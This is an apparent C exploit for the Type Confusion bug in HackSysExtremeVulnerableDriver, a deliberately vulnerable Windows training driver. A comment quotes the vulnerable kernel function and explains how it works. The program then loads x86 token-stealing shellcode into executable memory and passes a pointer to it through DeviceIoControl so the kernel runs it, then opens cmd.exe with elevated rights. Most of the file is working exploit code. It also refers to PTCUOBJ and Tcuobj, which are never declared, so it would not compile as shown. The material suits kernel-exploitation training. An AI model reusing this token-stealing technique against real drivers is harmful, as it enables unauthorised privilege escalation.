
/*

NTSTATUS TriggerTypeConfusion(IN PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject) {
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject = NULL;

    PAGED_CODE();

    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserTypeConfusionObject,
                     sizeof(USER_TYPE_CONFUSION_OBJECT),
                     (ULONG)__alignof(USER_TYPE_CONFUSION_OBJECT));

        // Allocate Pool chunk
        KernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)
                                     ExAllocatePoolWithTag(NonPagedPool,
                                                           sizeof(KERNEL_TYPE_CONFUSION_OBJECT),
                                                           (ULONG)POOL_TAG);

        if (!KernelTypeConfusionObject) {
            // Unable to allocate Pool chunk
            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(KERNEL_TYPE_CONFUSION_OBJECT));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);
        }

        DbgPrint("[+] UserTypeConfusionObject: 0x%p\n", UserTypeConfusionObject);
        DbgPrint("[+] KernelTypeConfusionObject: 0x%p\n", KernelTypeConfusionObject);
        DbgPrint("[+] KernelTypeConfusionObject Size: 0x%X\n", sizeof(KERNEL_TYPE_CONFUSION_OBJECT));

        KernelTypeConfusionObject->ObjectID = UserTypeConfusionObject->ObjectID;
        KernelTypeConfusionObject->ObjectType = UserTypeConfusionObject->ObjectType;

        DbgPrint("[+] KernelTypeConfusionObject->ObjectID: 0x%p\n", KernelTypeConfusionObject->ObjectID);
        DbgPrint("[+] KernelTypeConfusionObject->ObjectType: 0x%p\n", KernelTypeConfusionObject->ObjectType);


#ifdef SECURE
        // Secure Note: This is secure because the developer is properly setting 'Callback'
        // member of the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer
        // of 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
        // parameter
        KernelTypeConfusionObject->Callback = &TypeConfusionObjectCallback;
        Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
#else
        DbgPrint("[+] Triggering Type Confusion\n");

        // Vulnerability Note: This is a vanilla Type Confusion vulnerability due to improper
        // use of the 'UNION' construct. The developer has not set the 'Callback' member of
        // the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer of
        // 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
        // parameter
        Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
#endif

        DbgPrint("[+] Freeing KernelTypeConfusionObject Object\n");
        DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
        DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);

        // Free the allocated Pool chunk
        ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG);
        KernelTypeConfusionObject = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


<-----------------
To Put it simply the driver Costruct a kernel object and calls the init function with a pointer (part of the object struct)
then the init in turn calls the pointer provided without verification, we pass a pointer to our shell code to trigger
code execution.
---------------->

*/


#include <Windows.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	DWORD u = 0;

	char pl[60] =
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x31\xC0"
		"\xC3"
		;
	LPVOID pla = VirtualAlloc(
		NULL,
		sizeof(pl),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pla, pl, sizeof(pl));
	//LPVOID plAddress = &pla;
	
	typedef struct _OBJ {
		ULONG_PTR id;
		ULONG_PTR Type;
	} OBJ, *POBJ;
	
	POBJ obj = NULL;
	obj = (PTCUOBJ)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(OBJ)
	);

	obj->id = (ULONG_PTR)0x1;
	obj->Type = (ULONG_PTR)pla;

	DeviceIoControl(
		dev, 0x222023,
		(LPVOID)obj, sizeof(Tcuobj),
		NULL, 0, &u, (LPOVERLAPPED)NULL
	);
	
	system("cmd.exe");
	//HeapFree(GetProcessHeap(), NULL, (LPVOID)&Tcuobj);
	//Tcuobj = NULL;
	CloseHandle(dev);
	system("pause");
	return 0;
}
